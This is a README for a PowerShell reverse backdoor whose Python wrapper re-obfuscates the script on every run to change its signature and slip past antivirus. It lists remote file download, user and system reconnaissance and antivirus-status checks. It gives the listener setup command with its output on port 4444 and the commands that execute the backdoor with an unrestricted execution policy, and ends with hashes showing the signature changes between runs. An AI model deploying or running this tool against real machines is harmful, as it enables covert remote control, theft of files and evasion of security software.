# powershell-backdoor
Reverse Backdoor written in Powershell and obfuscated with python. Allowing the backdoor to have a new signature after every run.

## Preview
![preview](preview.PNG)
<br>
## Features
* Download Files from remote system
* Fetch target computers public IP address
* List local users
* Find Intresting Files
* Get OS Information
* Get BIOS Information
* Get Anti-Virus Status
* Get Active TCP Clients
* Checks for common pentesting software installed

## Setup
Don't change the code inside template.ps1, instead run listen.py
```
PS C:\Users\DrewQ\Desktop> python .\listen.py --verbose
[*] Encoding backdoor script
[*] Saved backdoor backdoor.ps1 sha1:02cf166bbe6fdf8f3db4d3e6d04e5e2cf8b98a6b
[*] Starting Backdoor Listener 192.168.0.223:4444
```
No arguments are required, backdoor.ps1 will be dropped in the current working directory.

## Backdoor Execution
Tested on Windows 11, Windows 10 and Kali Linux
```cmd
powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
```
```cmd
┌──(drew㉿kali)-[/home/drew/Documents]
└─PS> ./backdoor.ps1
```

## To Do 
* Add Standard Backdoor
* Find Writeable Directories
* Get Windows Update Status


## Output of 5 obfuscations/Runs 
```
sha1:c7a5fa3e56640ce48dcc3e8d972e444d9cdd2306
sha1:b32dab7b26cdf6b9548baea6f3cfe5b8f326ceda
sha1:e49ab36a7ad6b9fc195b4130164a508432f347db
sha1:ba40fa061a93cf2ac5b6f2480f6aab4979bd211b
sha1:f2e43320403fb11573178915b7e1f258e7c1b3f0
```
